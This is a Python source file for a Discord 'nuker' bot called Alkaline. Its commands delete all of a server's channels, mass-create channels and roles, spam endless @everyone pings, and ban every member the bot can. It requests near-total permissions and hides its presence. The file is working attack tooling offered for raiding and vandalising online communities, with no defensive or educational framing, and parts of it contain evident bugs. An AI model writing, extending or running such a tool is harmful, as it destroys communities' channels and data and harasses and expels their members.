import discord
from discord.ext import commands, tasks
import string
import random
from datetime import datetime
import json
import os

class Color:
    # text
    BLACK = "\033[30m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    # bg
    BG_BLACK = "\033[40m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_YELLOW = "\033[43m"
    BG_BLUE = "\033[44m"
    BG_MAGENTA = "\033[45m"
    BG_CYAN = "\033[46m"
    BG_WHITE = "\033[47m"
    # form
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    REVERSE = "\033[7m"
    CONCEALED = "\033[8m"

print(f"{Color.BLUE}{Color.BOLD}            _  _           _  _              ")
print("     /\\    | || |         | |(_)             ")
print("    /  \\   | || | __ __ _ | | _  _ __    ___ ")
print("   / /\\ \\  | || |/ // _` || || || '_ \\  / _ \\")
print("  / ____ \\ | ||   <| (_| || || || | | ||  __/")
print(f" /_/    \\_\\|_||_|\_\\__,_||_||_||_| |_| \___|{Color.RESET}")
print(f"\n{Color.CYAN}Welcome to Alkaline Nuker. Let's get started.\n")
print("Enter your Discord bot token:")
token = input(f"{Color.RESET}>> ")
print(f"{Color.CYAN}\nWhat is your Discord user ID?")
o_uid = int(input(f"{Color.RESET}>> "))

helpmsg = """
Welcome to Alkaline. Here are the available commands:

```
delallc - Delete all channels.
enuke - Everyone ping nuke.
nuke - Silent nuke.
rnuke - Role nuke.
send - Send a message using the bot.
delc - Delete a single channel.
banall - Bans all members possible.
```

See README.md for arguments and better descriptions.
"""

with open("temp.json", "w") as f:
    f.write(json.dumps({"e":0}, indent=2))

def fmt():
    ct = datetime.now().time()
    ft = f"[{ct:%H:%M:%S}.{ct.microsecond // 100000}]"
    return ft

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="a!", intents=intents) # feel free to change prefix, set to a! so it doesn't interfere with other bots

@bot.event
async def on_ready():
    print(f"{Color.CYAN}Logged in as {bot.user.name}\n{Color.BOLD}Invite URL: {Color.RESET}{Color.CYAN}https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=2146958847&scope=bot\n{Color.BOLD}Prefix: {Color.RESET}{Color.CYAN}{bot.command_prefix}{Color.RESET}")
    await bot.change_presence(status=discord.Status.invisible)

@bot.command(name="delallc")
async def delAllCh(ctx):
    if ctx.author.id == o_uid:
        cs = ctx.guild.channels
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}Starting Delete All Channels{Color.RESET}")
        for c in cs:
            await c.delete()

        print(f"{Color.MAGENTA}{fmt()} {Color.GREEN}Done with Delete All Channels operation{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}{ctx.author.name} {Color.RED}tried to run Delete All Channels{Color.RESET}")


@bot.command(name="enuke")
async def eNuke(ctx, num: int):
    if ctx.author.id == o_uid:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}Starting Everyone Nuke...{Color.RESET}")
        with open("temp.json", "w") as t:
                t.write(json.dumps({"e":1}, indent=2))
        for i in range(1, num + 1):
            n = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            c = await ctx.guild.create_text_channel(n)
        print(f"{Color.MAGENTA}{fmt()} {Color.GREEN}Done with Everyone Nuke... Proceeding to ping, do CTRL+C to cancel.{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}{ctx.author.name} {Color.RED}tried to run Everyone Nuke{Color.RESET}")

@bot.command(name="nuke")
async def nuke(ctx, num: int):
    if ctx.author.id == o_uid:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}Starting Nuke...{Color.RESET}")
        for i in range(1, num + 1):
            n = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            channel = await ctx.guild.create_text_channel(n)
            await channel.send(f"Nuked by Alkaline")
        print(f"{Color.MAGENTA}{fmt()} {Color.GREEN}Done with Nuke{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}{ctx.author.name} {Color.RED}tried to run Nuke{Color.RESET}")

@bot.command(name="rnuke")
async def rNuke(ctx, num: int):
    if ctx.author.id == o_uid:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}Starting Role Nuke...{Color.RESET}")
        for i in range(1, num + 1):
            n = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            channel = await ctx.guild.create_role(name=n)
        print(f"{Color.MAGENTA}{fmt()} {Color.GREEN}Done with Role Nuke{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}{ctx.author.name} {Color.RED}tried to run Role Nuke{Color.RESET}")

@bot.command(name="send")
async def send(ctx, cid, *, msg):
    if ctx.author.id == o_uid:
        c = bot.get_channel(cid)
        if c is None or c == None:
            print(f"{Color.MAGENTA}{fmt()} {Color.RED}Channel {cid} not found{Color.RESET}")
        else:
            await c.send(msg)
    

@bot.command(name="delc")
async def delC(ctx, id):
    if ctx.author.id == o_uid:
        c = bot.get_channel(id)
        if c in ctx.guild.channels:
            await c.delete()
            print(f"{Color.MAGENTA}{fmt()} {Color.GREEN}Deleted channel {id}{Color.RESET}")
        else:
            print(f"{Color.MAGENTA}{fmt()} {Color.RED}Channel {id} not found{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}{ctx.author.name} {Color.RED}tried to run Delete Channel{Color.RESET}")

@bot.command(name="banall")
async def banAll(ctx):
    if ctx.author.id == o_uid:
        ms = ctx.guildA.members
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}Starting Ban All Members...{Color.RESET}")
        for m in ms:
            try:
                await m.ban()
            except:
                print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}WARN: Could not ban {m}. Perhaps the bot is below it?")
        print(f"{Color.MAGENTA}{fmt()} {Color.GREEN}Banned all possible members{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.YELLOW}{ctx.author.name} {Color.RED}tried to run Ban All Members{Color.RESET}")

@bot.event
async def on_guild_channel_create(c):
    with open("temp.json") as f:
        j = json.load(f)
        e = j["e"]
        print(e)
        if e == 1:
            while True:
                await c.send("@everyone\n\nNuked by Alkaline")


@bot.event
async def on_command_error(ctx, e):
    if isinstance(e, commands.MissingRequiredArgument):
        print(f"{Color.MAGENTA}{fmt()} {Color.RED}Missing argument: {Color.BOLD}{e.param.name}{Color.RESET}{Color.RED} in command {Color.BOLD}{ctx.command.name}{Color.RESET}")
    else:
        print(f"{Color.MAGENTA}{fmt()} {Color.RED}ERROR: {e}{Color.RESET}")

bot.run(token)